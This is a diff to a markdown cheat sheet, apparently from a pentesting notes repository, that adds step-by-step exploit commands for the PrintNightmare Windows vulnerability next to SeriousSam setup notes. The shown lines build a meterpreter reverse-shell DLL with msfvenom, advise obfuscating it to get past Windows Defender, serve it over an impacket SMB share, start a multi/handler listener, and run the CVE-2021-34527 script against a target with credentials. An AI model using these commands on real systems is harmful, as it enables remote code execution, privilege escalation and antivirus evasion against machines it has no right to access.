@@ -13,7 +13,7 @@ Linux | Windows
 
 ### -> SeriousSam
 
-***Setup Command***
+***Setup commands***
 
 *Running a script on a low privilege user will cause an error, run the command below*
 
@@ -30,7 +30,7 @@ Link to [Github Repository](https://github.com/romarroca/SeriousSam/blob/main/se
 
 ### -> PrintNightmare
 
-***Setup Command***
+***Setup commands***
 
 Description | Commands&Links
 ------------|--------
@@ -41,6 +41,14 @@ Description | Commands&Links
 *Install the impacket version described in github repository* | [Repository](https://github.com/cube0x0/CVE-2021-1675)
 *Create meterpreter payload* | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=0000 -o reverse.dll`
 *Meterpreter payload only works when windows defender disabled* | **Obfuscate the payload**
+
+***Exploit commands***
+
+Description | Commands&Links
+------------|---------------------------------------------------------------------------------------------------
+*Setup smbserver in root mode in virtual enviroment with the correct impacket version* | `smbserver.py share $(pwd) -smb2support`
+*Create your multi/handler* | `multi/handler -- > set payload windows/x64/meterpeter/reverse_tcp`
+*Run the script* | `python3 CVE-2021-34527.py cyberlabs.com/cyberuser:'Password'@0.0.0.0 '\\0.0.0.0\share\shell.dll`
 
 **Discovery methods**
 
